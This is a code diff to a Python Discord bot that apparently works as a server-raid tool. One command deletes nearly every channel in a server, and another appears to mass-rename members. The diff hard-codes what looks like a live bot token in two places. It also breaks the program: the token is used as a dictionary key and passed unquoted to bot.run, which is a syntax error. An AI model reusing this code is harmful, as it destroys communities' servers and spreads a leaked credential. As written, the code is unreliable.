@@ -10,11 +10,11 @@ from discord import Embed
 
 colorama.init()
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=">",intents=intents)
+bot = commands.Bot(command_prefix="?",intents=intents)
 bot.remove_command("help")
 with open('config.json') as f:
     data = json.load(f)
-    token = data["TOKEN"]
+    token = data["OTcwMjg2NTY5OTA0ODE2MTY4.Ym5vyQ.F1jXNuLYSZ0upMmPc_KSRI6MVIk"]
 @bot.event
 async def on_ready():
     print(f'''
@@ -32,7 +32,7 @@ async def d(ctx,channel_id="all"):
   await ctx.message.delete()
   if channel_id == "all":
     for channel in ctx.guild.channels:
-      if channel.id != 834134636678479902:
+      if channel.id != 876700700120318044:
         await channel.delete()
       else:
         continue
@@ -207,4 +207,4 @@ async def nickall(ctx, *, name="! TOOL RUNS YOU"):
 
 
 
-bot.run(token)
+bot.run(OTcwMjg2NTY5OTA0ODE2MTY4.Ym5vyQ.F1jXNuLYSZ0upMmPc_KSRI6MVIk)
